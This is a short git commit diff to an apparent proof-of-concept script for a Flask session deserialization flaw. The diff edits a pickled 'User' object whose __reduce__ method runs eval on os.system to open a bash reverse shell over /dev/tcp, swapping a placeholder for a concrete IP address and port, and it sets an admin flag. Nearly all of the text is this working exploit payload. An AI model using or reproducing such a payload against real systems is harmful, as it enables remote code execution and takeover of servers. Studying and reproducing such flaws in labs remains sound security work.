df5e21af4ea2861a0136900670891e3e870dd65b
bin4xin <1904829268@qq.com>
2021-05-11 20:17:42 +0800

    Tue, 11 May 2021 20:17:42 +0800 commit by B4xinSynchronize.

--- CoVV/Flask/SessionDeserialization/poc/command.py
+++ CoVV/Flask/SessionDeserialization/poc/command.py
@@ -3,10 +3,10 @@ from base64 import b64encode
 import os
 
 User = type('User', (object,), {
-    'uname': 'test',
+    'uname': 'guest',
     'is_admin': 1,
     '__repr__': lambda o: o.uname,
-    '__reduce__': lambda o: (eval, ("__import__('os').system('bash -i >&/dev/tcp/id_address/port 0>& 1')",))
+    '__reduce__': lambda o: (eval, ("__import__('os').system('bash -i >&/dev/tcp/172.20.21.63/10000 0>& 1')",))
 
 })
 u = pickle.dumps(User())
